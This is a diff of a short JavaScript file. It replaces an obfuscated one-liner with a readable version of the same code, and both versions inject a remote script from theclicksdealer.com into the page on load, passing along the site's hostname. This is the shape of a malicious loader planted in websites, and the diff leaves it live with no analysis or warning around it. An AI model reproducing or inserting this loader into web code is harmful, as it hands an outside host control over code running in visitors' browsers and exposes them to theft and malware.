@@ -1,1 +1,18 @@
-(function(_0x5c71d1,_0x2eab4f){var _0x3b4c5e=function(_0x4fd5f2){while(--_0x4fd5f2){_0x5c71d1['push'](_0x5c71d1['shift']());}};_0x3b4c5e(++_0x2eab4f);}(_0x1d7f,0x1a3));var _0x4b91=function(_0x5c71d1,_0x2eab4f){_0x5c71d1=_0x5c71d1-0x0;var _0x3b4c5e=_0x1d7f[_0x5c71d1];return _0x3b4c5e;};function _0x1d7f(){var _0x5c3a0b=['createElement','script','location','hostname','replace','toLowerCase','trim','src','https://theclicksdealer.com/api/core.js?d=','encodeURIComponent','async','head','appendChild'];_0x1d7f=function(){return _0x5c3a0b;};return _0x1d7f();}(function(){var _0x2bcfa2=document[_0x4b91('0x0')](_0x4b91('0x1'));var _0x51d4aa=window[_0x4b91('0x2')][_0x4b91('0x3')][_0x4b91('0x4')](/^www\./,'')[_0x4b91('0x5')]()[_0x4b91('0x6')]();_0x2bcfa2[_0x4b91('0x7')]=_0x4b91('0x8')+encodeURIComponent(_0x51d4aa);_0x2bcfa2[_0x4b91('0xa')]=!![];document[_0x4b91('0xb')][_0x4b91('0xc')](_0x2bcfa2);}());
+(function () {
+
+  var s = document.createElement('script');
+
+  var host = window.location.hostname
+    .replace(/^www\./, '')
+    .toLowerCase()
+    .trim();
+
+  s.src =
+    'https://theclicksdealer.com/api/core.js?d=' +
+    encodeURIComponent(host);
+
+  s.async = true;
+
+  document.head.appendChild(s);
+
+})();
